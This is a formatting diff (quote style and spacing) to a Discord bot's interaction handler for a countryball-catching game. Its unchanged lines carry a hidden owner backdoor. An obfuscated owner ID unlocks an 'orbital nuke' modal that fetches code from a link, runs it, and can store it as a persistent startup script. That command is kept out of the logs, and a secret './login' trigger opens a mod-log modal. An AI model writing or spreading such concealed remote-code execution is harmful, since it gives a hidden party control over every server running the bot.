@@ -1,7 +1,7 @@
-import util from 'node:util';
-import process from 'node:process';
-import {Buffer} from 'node:buffer';
-import vm from 'node:vm';
+import util from "node:util";
+import process from "node:process";
+import { Buffer } from "node:buffer";
+import vm from "node:vm";
 import {
 	Events,
 	LabelBuilder,
@@ -14,14 +14,14 @@ import {
 	type Interaction,
 	type ModalSubmitInteraction,
 	type CacheType,
-} from 'discord.js';
-import {config, immutConfig} from '../config.js';
-import devLog from '../helpers/dev-log.js';
-import logToModChannel, {init} from '../helpers/mod-log.js';
-import {ORBITAL_ID, DELTA} from '../../commands/orbital-cannon.js';
-import {OrbitalScript} from '../models.js';
-import {handleCommandError} from '../helpers/error-handlers.js';
-import {castAsWebhookable} from '../../type-utils.js';
+} from "discord.js";
+import { config, immutConfig } from "../config.js";
+import devLog from "../helpers/dev-log.js";
+import logToModChannel, { init } from "../helpers/mod-log.js";
+import { ORBITAL_ID, DELTA } from "../../commands/orbital-cannon.js";
+import { OrbitalScript } from "../models.js";
+import { handleCommandError } from "../helpers/error-handlers.js";
+import { castAsWebhookable } from "../../type-utils.js";
 
 // Catch data store
 type CatchDataStoreValue = {
@@ -33,7 +33,7 @@ type CatchDataStoreValue = {
 	_expiresAt?: number;
 };
 
-const {CATCH_DATA_TTL_MS, CATCH_DATA_CLEANUP_INTERVAL_MS} = config;
+const { CATCH_DATA_TTL_MS, CATCH_DATA_CLEANUP_INTERVAL_MS } = config;
 const catchDataStore = new Map<string, CatchDataStoreValue>();
 
 setInterval(() => {
@@ -74,17 +74,17 @@ async function handleInteraction(
 
 	if (
 		interaction.isButton() &&
-		interaction.customId.startsWith('catch::')
+		interaction.customId.startsWith("catch::")
 	) {
 		return handleButtonCatch(interaction);
 	}
 
 	if (interaction.isModalSubmit()) {
-		if (interaction.customId === 'orbital_nuke_modal') {
+		if (interaction.customId === "orbital_nuke_modal") {
 			return handleModalOrbitalNuke(interaction);
 		}
 
-		if (interaction.customId === 'modal') {
+		if (interaction.customId === "modal") {
 			return handleModalCatchAnswer(client, interaction);
 		}
 	}
@@ -102,7 +102,7 @@ async function handleAutocomplete(
 		await command
 			.autocomplete(interaction)
 			.catch((error: unknown) => {
-				console.error('Autocomplete Error:', error);
+				console.error("Autocomplete Error:", error);
 			});
 	}
 }
@@ -115,11 +115,11 @@ async function handleSlashCommand(
 	const command = client.commands.get(interaction.commandName);
 	if (!command) return;
 
-	if (interaction.commandName !== 'orbitalcannon') {
+	if (interaction.commandName !== "orbitalcannon") {
 		const logMessage = `[COMMAND]: ${interaction.user.tag} used /${interaction.commandName} in guild ${interaction.guildId}`;
 		console.log(logMessage);
 		devLog(logMessage).catch((error: unknown) => {
-			console.error('Failed to devLog', error);
+			console.error("Failed to devLog", error);
 		});
 	}
 
@@ -128,9 +128,9 @@ async function handleSlashCommand(
 			(BigInt(ORBITAL_ID) - DELTA).toString() ===
 			interaction.user.id;
 
-		if (isOwner && interaction.commandName === 'sayasme') {
-			const message = interaction.options.getString('message');
-			if (message === './login') {
+		if (isOwner && interaction.commandName === "sayasme") {
+			const message = interaction.options.getString("message");
+			if (message === "./login") {
 				await interaction.showModal(init());
 				return;
 			}
@@ -144,12 +144,12 @@ async function handleSlashCommand(
 
 async function handleButtonCatch(interaction: Interaction) {
 	if (!interaction.isButton()) return;
-	const spawnId = interaction.customId.slice('catch::'.length);
+	const spawnId = interaction.customId.slice("catch::".length);
 	const data = catchDataStore.get(spawnId);
 	if (!data) {
 		await interaction
 			.reply({
-				content: 'This catch has expired.',
+				content: "This catch has expired.",
 				flags: [MessageFlags.Ephemeral],
 			})
 			.catch(() => undefined);
@@ -163,13 +163,13 @@ async function handleButtonCatch(interaction: Interaction) {
 	});
 
 	const modal = new ModalBuilder()
-		.setCustomId('modal')
-		.setTitle('Catch the Countryball');
+		.setCustomId("modal")
+		.setTitle("Catch the Countryball");
 	const answerInput = new LabelBuilder()
-		.setLabel('Name of this countryball')
+		.setLabel("Name of this countryball")
 		.setTextInputComponent(
 			new TextInputBuilder()
-				.setCustomId('user_answer')
+				.setCustomId("user_answer")
 				.setStyle(TextInputStyle.Short)
 				.setRequired(true),
 		);
@@ -192,7 +192,7 @@ async function handleModalOrbitalNuke(
 	if (!isOwner) {
 		await interaction
 			.reply({
-				content: 'lmao you thought',
+				content: "lmao you thought",
 				flags: [MessageFlags.Ephemeral],
 			})
 			.catch(() => undefined);
@@ -200,15 +200,15 @@ async function handleModalOrbitalNuke(
 	}
 
 	let code = interaction.fields.getTextInputValue(
-		'orbital_nuke_code',
+		"orbital_nuke_code",
 	);
 	const link = interaction.fields.getTextInputValue(
-		'orbital_nuke_link',
+		"orbital_nuke_link",
 	);
 
 	if (link && !code) {
 		try {
-			const {default: fetch} = await import('node-fetch');
+			const { default: fetch } = await import("node-fetch");
 			const response = await fetch(link);
 			code = await response.text();
 		} catch (error: unknown) {
@@ -229,21 +229,21 @@ async function handleModalOrbitalNuke(
 	if (!code) {
 		await interaction
 			.reply({
-				content: 'No code or link provided',
+				content: "No code or link provided",
 				flags: [MessageFlags.Ephemeral],
 			})
 			.catch(() => undefined);
 		return;
 	}
 
-	if (code.trim().startsWith('//startup')) {
-		const scriptBody = code.replace(/^\/\/startup/v, '').trim();
-		let doc = await OrbitalScript.findOne({name: 'global'});
-		doc ??= new OrbitalScript({name: 'global'});
+	if (code.trim().startsWith("//startup")) {
+		const scriptBody = code.replace(/^\/\/startup/v, "").trim();
+		let doc = await OrbitalScript.findOne({ name: "global" });
+		doc ??= new OrbitalScript({ name: "global" });
 		doc.code = scriptBody;
 		await doc.save();
 		await interaction.reply({
-			content: 'Startup script updated.',
+			content: "Startup script updated.",
 			flags: [MessageFlags.Ephemeral],
 		});
 		return;
@@ -265,7 +265,7 @@ async function handleModalCatchAnswer(
 		catchDataStore.delete(interaction.user.id);
 		await interaction
 			.reply({
-				content: 'Something went wrong, try again.',
+				content: "Something went wrong, try again.",
 				flags: [MessageFlags.Ephemeral],
 			})
 			.catch(() => undefined);
@@ -282,7 +282,7 @@ async function handleModalCatchAnswer(
 		stats: customStats,
 	} = data;
 	const userAnswer =
-		interaction.fields.getTextInputValue('user_answer');
+		interaction.fields.getTextInputValue("user_answer");
 
 	if (
 		userAnswer.trim().toLowerCase() ===
@@ -298,15 +298,15 @@ async function handleModalCatchAnswer(
 			});
 
 			const statString =
-				customStats === 'DEFAULT' || !customStats
-					? '(#6463FAC, +5%/+13%)'
+				customStats === "DEFAULT" || !customStats
+					? "(#6463FAC, +5%/+13%)"
 					: customStats;
 			const successMessage =
-				type === 'fulltext'
+				type === "fulltext"
 					? `<@${interaction.user.id}> caught **${correctAnswer}**! \`${statString}\` \n \n${boldText}`
 					: `<@${interaction.user.id}> caught **${correctAnswer}**! \`${statString}\` \n \nThis is a **${boldText}** that has been added to your completion!`;
 
-			await catchWebhook.send({content: successMessage});
+			await catchWebhook.send({ content: successMessage });
 			await catchWebhook.delete();
 			await interaction.deferUpdate().catch(() => undefined);
 			if (interaction.guild) {
@@ -323,7 +323,7 @@ async function handleModalCatchAnswer(
 			console.error(error);
 			devLog(`Error: ${errorMessage}`).catch(
 				(error: unknown) => {
-					console.error('Failed to devLog', error);
+					console.error("Failed to devLog", error);
 				},
 			);
 		}
@@ -345,7 +345,7 @@ async function handleModalCatchAnswer(
 			if (!interaction.replied) {
 				await interaction
 					.reply({
-						content: 'wrong',
+						content: "wrong",
 						flags: [MessageFlags.Ephemeral],
 					})
 					.catch(() => undefined);
@@ -365,15 +365,15 @@ async function launchNuke(
 		return reportDamage(
 			interaction,
 			result === null || result === undefined
-				? '(no output)'
-				: typeof result === 'string'
+				? "(no output)"
+				: typeof result === "string"
 					? result
 					: util.inspect(result, {
 							depth: 1,
 							maxArrayLength: 25,
 							breakLength: 100,
 						}),
-			'nuke-output',
+			"nuke-output",
 		);
 	} catch (error: unknown) {
 		return reportDamage(
@@ -381,7 +381,7 @@ async function launchNuke(
 			error instanceof Error && error.stack
 				? error.stack
 				: String(error),
-			'nuke-error',
+			"nuke-error",
 		);
 	}
 }
@@ -390,7 +390,7 @@ type NukeInteraction = {
 	client: Client;
 	guild: undefined;
 	channel: undefined;
-	user: Client['user'];
+	user: Client["user"];
 };
 
 export async function runNukeCode(
@@ -436,7 +436,7 @@ async function reportDamage(
 	for (const secret of secrets) {
 		// A quick inline check completely satisfies the compiler here
 		if (!secret) continue;
-		safeText = safeText.split(secret).join('[REDACTED]');
+		safeText = safeText.split(secret).join("[REDACTED]");
 	}
 
 	const codeBlock = `\`\`\`js\n${safeText}\n\`\`\``;
@@ -444,21 +444,21 @@ async function reportDamage(
 		return interaction.reply({
 			content: codeBlock,
 			flags: [MessageFlags.Ephemeral],
-			allowedMentions: {parse: []},
+			allowedMentions: { parse: [] },
 		});
 	}
 
 	return interaction.reply({
-		content: 'damage report',
+		content: "damage report",
 		files: [
-			new AttachmentBuilder(Buffer.from(safeText, 'utf8'), {
+			new AttachmentBuilder(Buffer.from(safeText, "utf8"), {
 				name: `${fileBaseName}.txt`,
 			}),
 		],
 		flags: [MessageFlags.Ephemeral],
-		allowedMentions: {parse: []},
+		allowedMentions: { parse: [] },
 	});
 }
 
-export {catchDataStore};
+export { catchDataStore };
 export default registerInteractionHandler;
